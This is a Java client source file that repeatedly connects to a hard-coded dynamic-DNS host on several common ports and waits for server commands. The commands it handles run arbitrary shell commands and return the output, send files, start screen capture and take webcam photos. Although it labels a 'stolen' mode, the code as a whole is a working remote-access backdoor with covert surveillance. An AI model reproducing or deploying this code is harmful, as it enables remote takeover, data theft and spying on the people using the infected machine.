package com.ben.client;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import org.apache.log4j.Logger;

import javax.imageio.ImageIO;

import com.ben.common.Message;
import com.github.sarxos.webcam.Webcam;

public class WorkerClass {
	static final Logger logger = Logger.getLogger(WorkerClass.class);
	private ObjectInputStream sInput;		// to read from the socket
	private ObjectOutputStream sOutput;		// to write on the socket
	public Socket socket;
public void Start() throws IOException, AWTException, InterruptedException
{
	boolean connected =false;
	int[] portnumbers = {5124,8080,80,443,3389,};
	while (!connected)
	{
		for (int i=0; i<portnumbers.length;i++)
		{
		Connect(portnumbers[i]);
		
		}
		Thread.sleep(1800000);
	}
}	
	     
private void Connect(int port)
{
	try
	{
		
		socket = new Socket("ben512.no-ip.org", port);
		sInput  = new ObjectInputStream(socket.getInputStream());
		sOutput = new ObjectOutputStream(socket.getOutputStream());
			
		new ListenFromServer().start();
		System.out.println("Connected to Server using port "+port);
		//sOutput.writeObject(new Message(Message.LOGIN,System.getProperty("user.name")));
		sOutput.writeObject(new Message(Message.LOGIN,java.net.InetAddress.getLocalHost().getHostName()));
		
		while (true)
		{
			sOutput.writeObject(new Message(Message.PING));
			Thread.sleep(600000);
		}
		
	}
	catch (Exception e)
	{
		System.out.println(e.toString()+" using port "+port);
		//return false;
	}
	
}
		
		

	
	
	
	

class ListenFromServer  extends Thread {

	public void run(){
		try {
			Message input;
			Runtime rt = Runtime.getRuntime();
		ScreenCapture s = new ScreenCapture(sOutput);
		OSValidator _OsValidator = new OSValidator();
		while(true)
		{
			
				input =  (Message) sInput.readObject();
				System.out.println("Received Message");
				switch(input.getType()) {
				case Message.ACK:
					//no problem. End program.
					sOutput.writeObject(new Message(Message.ACK,"Client received Ack"));
			//	System.exit(0);
					break;
				
				case Message.LOGOUT:
				
					sOutput.writeObject(new Message(Message.ACK,"Received Logout message. Shutting Down Client. Good Bye"));
					System.out.println("Received LOGOUT, shutting down...");
					System.exit(0);
				
					break;			
				case Message.COMMAND:
					System.out.println("Running command :" + input.getMessage());
					try{
						Process pr;	
						if (_OsValidator.IsWindows())
						{
						pr = rt.exec("cmd /c "+input.getMessage());
						}
						else
						{
						pr = rt.exec(input.getMessage());								
						}
					
					InputStream stdin = pr.getInputStream();
					InputStreamReader isr = new InputStreamReader(stdin);
					BufferedReader br = new BufferedReader(isr);
					
					String line = null;
					String output="\n";
					while ( (line = br.readLine()) != null)
						{
						 System.out.println(line);
					    output +=line+"\n";
						}
					
					sOutput.writeObject(new Message(Message.MESSAGE,output));
					}
					
					catch (Exception e)
					{
						sOutput.writeObject(new Message(Message.MESSAGE,e.toString()));
					}
					//no problem. End program.
				
				break;
				
				case Message.STOLLEN:
					sOutput.writeObject(new Message(Message.ACK,"Received Ack, computer stollen. Sending screencaptures...."));
					//Stollen, start taking photos.
					if (!s.isAlive())
					{
					s.start();
					}
				break;
				case Message.FILE:
				
					FileTransfer f = new FileTransfer(sOutput,input.getMessage());
					if (!f.isAlive())
					{
					f.start();
					}
					
				break;
				case Message.WEBCAM:
					System.out.println("Trying Webcam");
					try{
					Webcam webcam = Webcam.getDefault();
					webcam.open();
					BufferedImage image = webcam.getImage();
				//	ImageIO.write(image, "JPG", new File("test.jpg")); 
					ByteArrayOutputStream baos = new ByteArrayOutputStream();
				    ImageIO.write( image, "jpg",baos );
					baos.flush();
					byte[] imageInByte = baos.toByteArray();
					//	sOutput.writeObject(new Message(Message.LOGIN,"testjessage"));
					sOutput.writeObject(new Message(Message.IMAGE,imageInByte));
					webcam.close();
					}
					catch (Exception e)
					{
						sOutput.writeObject(new Message(Message.MESSAGE,e.toString()));
					}
				break;
				}
		}
		
		}
		catch(Exception e)
		{
			System.out.println(e.toString());
		}
		
	}
}
}
